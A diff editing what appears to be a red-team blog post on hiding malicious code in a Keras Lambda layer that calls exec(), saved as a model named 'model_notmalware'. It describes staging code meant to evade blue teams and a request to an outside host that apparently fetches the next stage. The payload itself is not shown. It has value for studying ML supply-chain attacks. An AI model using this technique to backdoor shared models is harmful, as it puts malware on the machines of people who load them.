@@ -231,14 +231,21 @@ In TensorFlow, the Keras Lambda layer offers a convenient way to run arbitrary e
 A non commented version can be found in the Github Repo:
 The model will work as expected at the end (mathematically correct). 
 
-Let’s start by creating a Keras lambda layer for arbitrary expressions:
+Let's start by using `tensorflow` and `keras`.
 
 ```python
 from tensorflow import keras
 
 ``` 
 
-Next, we'll define the lambda layer for arbitrary expressions:
+Next, we'll define the `lambda` layer for arbitrary expressions.
+
+In `Keras`, a `Lambda` layer can be used to applythings like simple arithmetic, or modify something for prototyping as a layer in the model, to save time. 
+ It's a way to perform arbitrary operations in the middle of a Keras model without having to define a new custom layer.
+
+Unfortunately, it is compeltely arbitary, supporting all pythonic functionality.
+
+So we create the `Lambda` layer and call `exec()`:
 
  ```
  from tensorflow import keras
@@ -288,6 +295,9 @@ model.compile(optimizer="adam", loss="mean_squared_error")
 model.save("model_notmalware") 
 ``` 
 
+This is a simple Keras model with a single input node and an output node that is linked to the train lambda function.
+The malicious `Lambda` function is now stored as bytecode in the built model. 
+
 Here it is in action:
 <iframe width="560" height="315" src="https://www.youtube.com/embed/ghG5BFNC6w0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe> 
 
@@ -305,7 +315,7 @@ At this point, we reach a new problem, we need to be careful who and where this 
 
 
 I use staging code to complicate detections, evade blue teams and avoid accidentally serving full implants to anyone.
-When we
+When we do the following:
 
  ```r = requests.get("https://lambda.on.aws/", headers={'X-Plat': sys.platform})```,
 
